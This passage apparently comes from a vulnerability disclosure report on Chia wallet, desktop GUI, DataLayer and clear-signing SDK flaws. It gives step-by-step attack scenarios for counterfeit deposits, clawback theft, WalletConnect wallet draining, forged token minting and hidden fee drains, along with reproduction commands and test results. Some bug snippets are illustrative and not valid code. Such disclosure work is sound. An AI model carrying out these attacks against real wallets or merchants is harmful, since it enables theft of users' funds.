2. **Step 2 — Zero-Capital (`0 XCH`) Counterfeit Coin Injection Into SQLite `WalletCoinStore`:** Because the header itself is a real canonical header from the blockchain, header-level checks pass. An attacker with `0 XCH` capital swaps `foliage_transaction_block` with a fabricated payload crediting the merchant's puzzle hash (`+0.5 XCH` = `500,000,000,000 mojo` or `+1,000 XCH`). The victim wallet inserts the counterfeit coin into `WalletCoinStore` as a confirmed on-chain balance that persists across wallet restarts.
3. **Step 3 — Post-Settlement Spend Failure (`Err.UNKNOWN_UNSPENT`):** Once the merchant releases goods, USDT, or BTC in exchange for the displayed confirmed XCH deposit and later attempts to sweep or spend the credited coin, `FullNode` mempool validation rejects the transaction with `Err.UNKNOWN_UNSPENT` because the coin never existed on the canonical blockchain.

```python
# File: chia/wallet/wallet_node.py (lines 926-995)
async def _add_block_from_header(self, header_block: HeaderBlock, ...):
    # BUG: Missing cryptographic binding check between signed header and transaction block body:
    # if header_block.foliage_transaction_block is not None:
    #     if header_block.foliage_transaction_block.get_hash() != header_block.foliage.foliage_transaction_block_hash:
    #         raise ValueError("Invalid foliage_transaction_block_hash")
    additions, removals = await self.get_additions_and_removals(header_block, ...)
    await self.wallet_state_manager.add_block(...)
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Zero-Capital (`0 XCH`) Fake Deposit to an OTC Desk, Payment Gateway, or Merchant to Cash Out Real USDT/BTC:** Unlike a traditional 51%/reorg double-spend (which requires purchasing real XCH and mining a competing fork), an attacker with `0 XCH` capital connects to a merchant or OTC desk running a Chia Light Wallet and sends a `RespondBlockHeader` containing a genuine block header paired with a swapped `foliage_transaction_block`. The merchant's wallet immediately displays a confirmed `+0.5 XCH` (`500,000,000,000 mojo`) or `+1,000 XCH` deposit without requiring any counterparty approval. The attacker collects the real USDT/BTC payout and leaves before the merchant discovers the coin fails on-chain with `Err.UNKNOWN_UNSPENT`.
* **Scenario B — Automated E-Commerce & Cross-Chain Relayer Poisoning Across SQLite Restarts:** Because `_add_block_from_header` commits the counterfeit `CoinState` directly into SQLite `WalletCoinStore`, cold-reloading the wallet database (`reopened_sqlite_coin_present: true`) continues to report the phantom balance as confirmed, tricking automated order-fulfillment bots into shipping digital goods or gift cards.
* **Scenario C — Combined Chain (`CONS-SP-01` Full-Node Sync Lockout + `WLC-01` Light-Wallet Fake Deposit):** An attacker first stalls a merchant's primary FullNode on port `8444` via `CONS-SP-01` so the operator switches or falls back to light-wallet P2P header sync, and immediately injects the swapped `foliage_transaction_block` payload to credit counterfeit XCH.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect _add_block_from_header in chia/wallet/wallet_node.py
sed -n '926,995p' /home/community-user/targets/chia-blockchain/chia/wallet/wallet_node.py

# 2. Run the RED -> GREEN End-to-End Verification Harness for WLC-01
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_ek_kanit_gereksinimleri_20261030.py -k wlc01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_ek_kanit_gereksinimleri_20261030.py -k wlc01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-WLC-01": {
    "RED": {
      "attacker_initial_xch_capital_mojo": 0,
      "accepted_swapped_foliage_transaction_block": true,
      "fake_merchant_deposit_increase_mojo": 500000000000,
      "reopened_sqlite_coin_present": true,
      "subsequent_spend_mempool_error": "Err.UNKNOWN_UNSPENT"
    },
    "GREEN": {
      "accepted_swapped_foliage_transaction_block": false,
      "fake_merchant_deposit_increase_mojo": 0,
      "reopened_sqlite_coin_present": false,
      "rejection_error": "ValueError: Invalid foliage_transaction_block_hash"
    }
  }
}
```


---

### III.21 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Wallet Unauthenticated `RespondRemovals` / `RespondCoinState` Phantom Spent-Height Poisoning & Timelock Clawback Cancellation Lockout (`WLC-02`) (`CWE-345 / CWE-400`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/wallet/wallet_node.py:725-777`, `chia/wallet/wallet_state_manager.py:1735-1778`
* **Vulnerability Class & Score:** `CWE-345 / CWE-400` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md`](advisories/ja/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unverified `RespondRemovals(..., proofs=None)` & `spent_height` Acceptance (`wallet_node.py:725-777` & `wallet_state_manager.py:1735-1778`):** When a wallet synchronizes coin removals or receives a `RespondRemovals` message with `proofs=None` (or an unverified `CoinState` with `spent_height` set), `_add_coin_states` updates the coin's `spent_height` in SQLite `WalletCoinStore` without verifying a Merkle removal proof against a validated peak header.
2. **Step 2 — Persistent SQLite Lockout of Clawback Cancellation (`t1_cold_reloaded_sqlite_spent: true`):** Even after a cold SQLite reload (`WalletCoinStore`), the unspent Clawback coin (`0.5 XCH` = `500,000,000,000 mojo`, coin ID `e088f25d50be49d29eb144248071f377d5f7bbdb5d7dd34078c9c72276a0b649`) remains marked as `spent_height=8`. When the sender tries to cancel/claw back the transfer during the timelock window, `spend_clawback_coins` generates `0` transactions (`t2_sender_cancel_tx_count: 0`).
3. **Step 3 — Attacker Claims Real On-Chain Funds After Timelock Expiry (`SpendBundle SHA-256: 33361e6b2d8ee0d9...`):** Because the coin was never actually spent on-chain, the moment the Clawback timelock expires (`t4`), the attacker broadcasts a valid `SpendBundle` (`930 bytes`) and sweeps the real `0.5 XCH` on-chain.

```python
# File: chia/wallet/wallet_node.py (lines 725-777) & wallet_state_manager.py (lines 1735-1778)
# BUG: Accepts RespondRemovals with proofs=None or unverified spent_height without Merkle proof verification
if not validate_removals(coin_Main, proofs, peak_header):
    # Missing fail-closed rejection before updating WalletCoinStore spent_height!
await self.coin_store.set_spent(coin_name, spent_height)
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Blocking 24-Hour Clawback Cancellation Until Timelock Expiry to Steal `0.5 XCH` (`500,000,000,000 mojo`):** A sender transfers `0.5 XCH` protected by a Clawback timelock (`coin_id: e088f25d50be49d29eb144248071f377d5f7bbdb5d7dd34078c9c72276a0b649`). The attacker poisons the sender's wallet with `RespondRemovals(height=8, coins=[(coin_name, None)], proofs=None)`. Throughout the timelock window, the sender's Clawback cancellation button fails (`tx_count: 0`), and once the timelock expires, the attacker claims the real on-chain `0.5 XCH` (`SpendBundle SHA-256: 33361e6b2d8ee0d9bdd37738c4b2e54ece03c1eb507de8e59b370a1bd100e1e1`).
* **Scenario B — Unified Timeline Chain (`WLC-02` + `VR-01 / POC-10` — Blocking Both Wallet GUI Recovery and Emergency `chia-vault-recover` CLI):** On a single continuous timeline (`t0..t4`), the attacker simultaneously poisons the victim's live wallet state via `WLC-02` (`t1_cold_reloaded_sqlite_spent: true`) and sends a 1-mojo decoy launcher coin (`2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf`) to break the victim's fallback `chia-vault-recover` CLI (`t3_poc10_matches_victim: false`), neutralizing both recovery paths until the timelock expires.
* **Scenario C — Custodial Hot-Wallet & DeFi Liquidation Bot UTXO Freeze:** Poisoning unspent UTXOs as `spent_height != None` in SQLite prevents automated market makers and custodial payout nodes from selecting those coins until a full resync is performed.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect removal validation in chia/wallet/wallet_node.py and wallet_state_manager.py
sed -n '725,777p' /home/community-user/targets/chia-blockchain/chia/wallet/wallet_node.py

# 2. Run the Unified Timeline (t0..t4) & SQLite Cold-Reload Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k wlc02
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k wlc02
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-WLC-02": {
    "RED": {
      "clawback_coin_id": "e088f25d50be49d29eb144248071f377d5f7bbdb5d7dd34078c9c72276a0b649",
      "clawback_amount_mojo": 500000000000,
      "t1_cold_reloaded_sqlite_spent": true,
      "t2_sender_cancel_tx_count": 0,
      "t3_poc10_matches_victim": false,
      "t4_recipient_claim_spend_bundle_sha256": "33361e6b2d8ee0d9bdd37738c4b2e54ece03c1eb507de8e59b370a1bd100e1e1",
      "t4_recipient_claim_bytes": 930
    },
    "GREEN": {
      "t1_cold_reloaded_sqlite_spent": false,
      "t2_sender_cancel_tx_count": 1,
      "t3_poc10_matches_victim": true,
      "sender_clawback_cancel_succeeded": true
    }
  }
}
```


---

### III.22 — Chia-Network/chia-blockchain-gui (`<= 2.6.1-rc2.dev60 (verified on commit 2f6ee83a23ac8b0370b96111e02f8edfb81fa1f3)`) — Chia Desktop GUI WalletConnect Unscoped 29-Command Grant & Concurrent Confirmation Modal Overwrite TOCTOU (`GUI-WC-01`) (`CWE-367 / CWE-285`, CVSS `8.8 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain-gui` (`npm / TypeScript (Electron Desktop GUI): chia-blockchain-gui`)
* **Affected Versions & Components:** `<= 2.6.1-rc2.dev60 (verified on commit 2f6ee83a23ac8b0370b96111e02f8edfb81fa1f3)` — `packages/gui/src/components/walletConnect/WalletConnectContext.tsx:314-441`, `constants/WalletConnectCommands.ts`
* **Vulnerability Class & Score:** `CWE-367 / CWE-285` — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md`](advisories/ja/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — All 29 WalletConnect Commands Exposed Upon Pairing (`constants/WalletConnectCommands.ts`):** When a user connects their Chia desktop wallet to any website/dApp (even one claiming to only check an address or NFT eligibility), the WalletConnect session namespace grants access to all 29 RPC commands, including `chia_sendTransaction`, `chia_spendCAT`, and `chia_takeOffer`.
2. **Step 2 — Concurrent Request Modal Overwrite (`WalletConnectContext.tsx:314-441`):** `handleSessionRequest` does not serialize incoming JSON-RPC requests with a FIFO lock. When a malicious dApp sends a benign `chia_getCurrentAddress` request followed milliseconds later by `chia_sendTransaction`, the confirmation state/promise overlaps so that clicking Approve on the benign prompt dispatches `chia_sendTransaction` (`0.5 XCH` signed `SpendBundle SHA-256: d2ce22645a9a23b165da6f3895d1139ed334a91aaef4e56d027f8b0c12754980`).
3. **Step 3 — Post-Approval Context Switch (`TOCTOU` on Fingerprint, Network, and Pairing):** Between the moment the user clicks Approve (`check`) and `sendCommand` execution (`use`), `WalletConnectContext.tsx` does not verify that the active key fingerprint, network (`mainnet`/`testnet`), and pairing session still match the approved snapshot.

```typescript
// File: packages/gui/src/components/walletConnect/WalletConnectContext.tsx (lines 314-441)
async function handleSessionRequest(event: SignClientTypes.EventArguments['session_request']) {
  // BUG 1: No FIFO mutex/queue serializing concurrent session_request events
  // BUG 2: No immutable binding of (requestId, method, paramsHash, fingerprint, network) in sendCommand
  const confirmed = await showConfirmationDialog(event);
  if (confirmed) {
    return await sendCommand(command, params);
  }
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — 'Free Chia Airdrop / Address Checker' Website Drains Wallet Behind a `getCurrentAddress` Prompt:** A victim connects their desktop wallet to a dApp and sees a harmless `chia_getCurrentAddress` modal. In the same millisecond, the dApp sends `chia_sendTransaction` (`500,000,000,000 mojo` = `0.5 XCH`). When the victim clicks Confirm, `WalletRpcClient.send_transaction` executes and broadcasts signed `SpendBundle` `d2ce22645a9a23b165da6f3895d1139ed334a91aaef4e56d027f8b0c12754980`.
* **Scenario B — Burner-Wallet to Cold/Main-Wallet Fingerprint Switch (`TOCTOU`):** A user pairs a 0-XCH burner key (`fingerprint: 111111`), but a concurrent fingerprint/context switch causes `sendCommand` to execute the spend against the user's `999999` main wallet.
* **Scenario C — Post-Disconnect Replay During Pending Confirmation:** Even if the user disconnects the pairing or switches networks while a confirmation promise is in flight, unpatched `sendCommand` still dispatches the RPC call (`GREEN` blocks all 3 vectors: `concurrent_rejected`, `context_switch_rejected`, `unknown_method_rejected`).

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect handleSessionRequest and sendCommand in WalletConnectContext.tsx
sed -n '314,441p' /home/community-user/targets/chia-blockchain-gui/packages/gui/src/components/walletConnect/WalletConnectContext.tsx

# 2. Run the Live WSS Relay -> GUI Handler -> WalletRpcClient E2E Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k gui_wc01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k gui_wc01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-GUI-WC-01": {
    "RED": {
      "displayed_prompt_method": "chia_getCurrentAddress",
      "concurrent_injected_method": "chia_sendTransaction",
      "modal_overwritten_by_second_request": true,
      "unauthorized_send_transaction_dispatched": true,
      "drained_amount_mojo": 500000000000,
      "signed_spend_bundle_sha256": "d2ce22645a9a23b165da6f3895d1139ed334a91aaef4e56d027f8b0c12754980"
    },
    "GREEN": {
      "distinct_wss_packets_tested": 6,
      "benign_get_current_address_succeeded": true,
      "benign_send_transaction_succeeded": true,
      "concurrent_modal_overwrite_rejected": true,
      "fingerprint_network_pairing_switch_rejected": true,
      "unknown_method_rejected": true
    }
  }
}
```


---

### III.23 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia DataLayer `WalletRpcApi.dl_verify_proof` Missing Singleton Lineage Verification Allowing 1-Mojo Counterfeit Proofs & Unbacked `100,000 CAT` On-Chain Minting (`DL-01`) (`CWE-347 / CWE-345`, CVSS `9.1 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/rpc/wallet_rpc_api.py:4066-4120` (`dl_verify_proof`), `chia/data_layer/data_layer_util.py`
* **Vulnerability Class & Score:** `CWE-347 / CWE-345` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md`](advisories/ja/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing Singleton Top-Layer & Launcher Lineage Check in `WalletRpcApi.dl_verify_proof` (`chia/rpc/wallet_rpc_api.py:4066-4120`):** When verifying a `DLProof` (`ProofOfInclusion`), `dl_verify_proof` confirms that the referenced coin (`coin_id`) was spent on-chain and that its inner puzzle announcement matches the Merkle root of the key/value pairs, plus checks `dl_wallet.get_latest_singleton(store_id)` for existence. However, it **never calls `match_dl_singleton`** on the proof's parent coin spend to verify that the coin is actually the canonical DataLayer singleton for `store_id`!
2. **Step 2 — 1-Mojo Non-Singleton Coin Forges Any Official `store_id` Root:** An attacker spends a 1-mojo standard non-singleton coin (`coin_id: 86ec0dd71fbc7e415e06dc504e8e74436cf4f60d2f4ab942fc2104685b20dd17`) whose puzzle emits the announcement format expected by `dl_verify_proof` while referencing the victim institution's `store_id` (`806a6c73c7344b24d23915a319f82da69e1129a70e3ef772da2be14de2b4a5d6`). `WalletRpcApi.dl_verify_proof` returns `{"verified": true, "verified_clvm_hashes": true, "current_root": true}`.
3. **Step 3 — End-to-End On-Chain Minting of `100,000 CAT` (`100,000,000 CAT mojo`):** When a bridge, RWA issuer, or carbon-credit minter gates token issuance on `WalletRpcApi.dl_verify_proof`, the forged 1-mojo proof triggers a real `CATWallet` issuance (`cat_asset_id: 73dc2527f5a75964c9b1b019def41d17aaa1f22d42235f479114c2e505f679f5`, `issuance SpendBundle SHA-256: 6a635760183480c0c94ccf7786c1700fa5b7d7b0ae2532da49ff22edc3257c5e`, `delivery SpendBundle SHA-256: dc3f0bbaac81e982baa174241b3a69fba1b8a34e7033d8e1465ecd832ea18196`), crediting the attacker with `100,000 CAT` on-chain.

```python
# File: chia/rpc/wallet_rpc_api.py (lines 4066-4120)
async def dl_verify_proof(self, request: dict[str, Any]) -> EndpointResult:
    proof = DLProof.from_json_dict(request)
    verified_clvm_hashes = dl_verify_proof(proof)
    # BUG: Verifies coin existence and Merkle hash, but NEVER verifies that the parent coin spend
    # matches SINGLETON_TOP_LAYER_MOD with launcher_id == proof.store_proofs.store_id!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — 1-Mojo Counterfeit DataLayer Reserve Proof Mints `100,000 CAT` (`100,000,000 CAT mojo`) On-Chain:** An institutional RWA/stablecoin bridge tracks collateralized minting approvals in DataLayer store `806a6c73c7344b24d23915a319f82da69e1129a70e3ef772da2be14de2b4a5d6` (backed by `1,000 XCH` collateral). The attacker spends a 1-mojo non-singleton coin (`86ec0dd71fbc7e41...`) announcing `mint_allowance=100000000` and submits the `DLProof` to `WalletRpcApi.dl_verify_proof`. Because `dl_verify_proof` returns `verified: true, current_root: true`, the bridge mints and delivers `100,000 CAT` on-chain (`SpendBundle` `dc3f0bbaac81e982baa174241b3a69fba1b8a34e7033d8e1465ecd832ea18196`).
* **Scenario B — Side-by-Side Intrinsic RPC Forgery Against Any Third-Party Verifier (`test_dl01_side_by_side_canonical_vs_counterfeit_dl_verify_proof`):** Even without a bridge consumer, calling `WalletRpcApi.dl_verify_proof` directly with a canonical singleton proof vs. a 1-mojo non-singleton counterfeit proof returns identical `verified: true` responses in `RED`, proving the defect is intrinsic to Chia's RPC verifier.
* **Scenario C — Counterfeit Carbon-Credit / Registry Audit Attestations:** An attacker forges retirement or issuance records against an official climate registry's `store_id` using a 1-mojo coin spend.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect WalletRpcApi.dl_verify_proof in chia/rpc/wallet_rpc_api.py
sed -n '4066,4120p' /home/community-user/targets/chia-blockchain/chia/rpc/wallet_rpc_api.py

# 2. Run both the Intrinsic Side-by-Side RPC Test and the 100,000 CAT On-Chain Mint Test (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k dl01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k dl01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-DL-01": {
    "RED": {
      "victim_store_id": "806a6c73c7344b24d23915a319f82da69e1129a70e3ef772da2be14de2b4a5d6",
      "forged_non_singleton_coin_id": "86ec0dd71fbc7e415e06dc504e8e74436cf4f60d2f4ab942fc2104685b20dd17",
      "dl_verify_proof_verified": true,
      "dl_verify_proof_current_root": true,
      "cat_asset_id": "73dc2527f5a75964c9b1b019def41d17aaa1f22d42235f479114c2e505f679f5",
      "cat_issuance_spend_bundle_sha256": "6a635760183480c0c94ccf7786c1700fa5b7d7b0ae2532da49ff22edc3257c5e",
      "cat_delivery_spend_bundle_sha256": "dc3f0bbaac81e982baa174241b3a69fba1b8a34e7033d8e1465ecd832ea18196",
      "attacker_minted_cat_mojo": 100000000,
      "attacker_minted_cat_tokens": 100000
    },
    "GREEN": {
      "canonical_singleton_proof_verified": true,
      "counterfeit_non_singleton_proof_verified": false,
      "attacker_minted_cat_mojo": 0
    }
  }
}
```


---

### III.24 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Permissive `Condition::Other` Bypass Allowing Hidden `750 XCH` Fee Drain & NFT Transfer-Program Spoofing (`CS-01` / `POC-1 & POC-2`) (`CWE-451 / CWE-345`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs`, `crates/chia-sdk-driver/src/clear_signing/tests.rs`
* **Vulnerability Class & Score:** `CWE-451 / CWE-345` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md`](advisories/ja/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Parser Divergence Between Consensus CLVM (`chia_rs`) and `cni-wallet-sdk` (`clear_signing.rs`):** Chia's consensus CLVM engine ignores extra trailing arguments on condition opcodes such as `RESERVE_FEE` (`(52 amount extra_atom)`), executing the full fee reservation on-chain. However, `cni-wallet-sdk` parses conditions using strict fixed-arity structs and silently wraps any condition with trailing atoms into `Condition::Other(NodePtr)` instead of rejecting it.
2. **Step 2 — Hidden `750 XCH` (`750,000,000,000,000 mojo`) Fee Drain (`POC-1`):** In `SpendBundle` `b9b614d01ee2b104325a7dde22c33c498ed9e2e6925f957411d9d9d162f06e5c` (`1,105 bytes`), a vault spend emits an overlong `RESERVE_FEE` condition for `750 XCH`. Unpatched Clear-Signing ignores `Condition::Other` and displays `reserved_fee: 0` to the hardware/mobile signer while consensus consumes `750 XCH`.
3. **Step 3 — Unvalidated NFT `-24` Transfer-Program / Metadata State Mutation (`POC-2`):** Similarly, non-canonical or uninspected NFT state conditions in `SpendBundle` `17d2796f8bd6b9bf9fc1f03cb0570be6ac6393215c27cf61718b2eb9924dd128` (`3,274 bytes`) alter NFT control on-chain while being omitted from the Clear-Signing summary.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Condition::Other(_) variants (such as overlong RESERVE_FEE opcode 52 or unparsed NFT opcodes)
// are silently ignored instead of returning Error::UnsupportedCondition / failing closed:
match condition {
    Condition::ReserveFee(fee) => reserved_fee += fee.amount,
    Condition::Other(_) => { /* silently ignored in unpatched RED! */ }
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Draining `750 XCH` (`750,000,000,000,000 mojo`) from an Enterprise Vault via Hidden `RESERVE_FEE` (`POC-1`):** An attacker proposes a routine Vault transaction (`SpendBundle SHA-256: b9b614d01ee2b104325a7dde22c33c498ed9e2e6925f957411d9d9d162f06e5c`). The Clear-Signing screen on the signer's device reports `reserved_fee = 0`, inducing the custodian to sign; when broadcast, `750 XCH` is drained as block fee (`consensus_reserved_fee_mojo: 750000000000000`).
* **Scenario B — Silent NFT Ownership / Transfer-Program Hijack (`POC-2`):** A collector signs an NFT transaction (`SpendBundle SHA-256: 17d2796f8bd6b9bf9fc1f03cb0570be6ac6393215c27cf61718b2eb9924dd128`) whose Clear-Signing preview shows a benign update while the unparsed condition mutates the NFT state on-chain.
* **Scenario C — Colluding Pool / Farmer Fee Extraction:** An attacker partners with a farmer or mempool relayer to capture the hidden `750 XCH` fee output immediately upon block inclusion.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the Clear-Signing Rust Proof Suite in cni-wallet-sdk (POC-1 & POC-2)
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc1_and_poc2 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-01": {
    "RED": {
      "poc1_spend_bundle_sha256": "b9b614d01ee2b104325a7dde22c33c498ed9e2e6925f957411d9d9d162f06e5c",
      "poc1_spend_bundle_bytes": 1105,
      "poc1_clear_signing_displayed_fee_mojo": 0,
      "poc1_consensus_drained_fee_mojo": 750000000000000,
      "poc2_spend_bundle_sha256": "17d2796f8bd6b9bf9fc1f03cb0570be6ac6393215c27cf61718b2eb9924dd128",
      "poc2_spend_bundle_bytes": 3274
    },
    "GREEN": {
      "poc1_rejected_fail_closed": true,
      "poc2_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.25 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Uninspected NFT `NEW_METADATA_INFO` Updater Conditions Allowing Hidden `500 XCH` Drain (`CS-02` / `POC-3`) (`CWE-451 / CWE-345`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (`NEW_METADATA_INFO` evaluation)
* **Vulnerability Class & Score:** `CWE-451 / CWE-345` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md`](advisories/ja/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — NFT State Layer Executes Conditions Returned by the Metadata Updater Program:** Under Chia's CHIP-0007 NFT standard, when an inner spend emits a `NEW_METADATA_INFO` (`-24`) condition, the NFT state layer executes the metadata updater puzzle and merges any returned conditions into the spend's output conditions.
2. **Step 2 — Clear-Signing Discards Additional Conditions Emitted by the Metadata Updater (`clear_signing.rs`):** While `cni-wallet-sdk` evaluates the metadata updater to inspect updated metadata, it discards additional consensus conditions (such as `RESERVE_FEE` for `500 XCH` = `500,000,000,000,000 mojo`) returned by the updater program.
3. **Step 3 — `500 XCH` Drained Behind a '0 Fee' NFT Update Preview (`SpendBundle SHA-256: b314b6d7411bfb8a...`):** In `SpendBundle` `b314b6d7411bfb8a87bd4b091a117b861e5a171ed4a0a4712955c592962042e6` (`3,300 bytes`), the user sees `reserved_fee = 0` on the Clear-Signing screen while consensus drains `500 XCH`.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Evaluates NEW_METADATA_INFO metadata updater program for metadata diff,
// but ignores extra consensus conditions (e.g. RESERVE_FEE 500 XCH) returned by the updater!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — 'Free NFT Metadata Reveal' Transaction Drains `500 XCH` (`500,000,000,000,000 mojo`):** A user signs an NFT reveal/update bundle (`b314b6d7411bfb8a87bd4b091a117b861e5a171ed4a0a4712955c592962042e6`) displaying `reserved_fee = 0` in Clear-Signing, losing `500 XCH` to consensus fees upon broadcast.
* **Scenario B — Malicious Custom Metadata Updater in Traded NFTs:** An attacker mints an NFT with a custom metadata updater puzzle and sells/transfers it to a vault; when the vault later updates or transfers the NFT, the hidden updater condition triggers.
* **Scenario C — Patched Verification (`GREEN`):** The patched driver rejects any metadata updater output emitting unexpected consensus conditions.

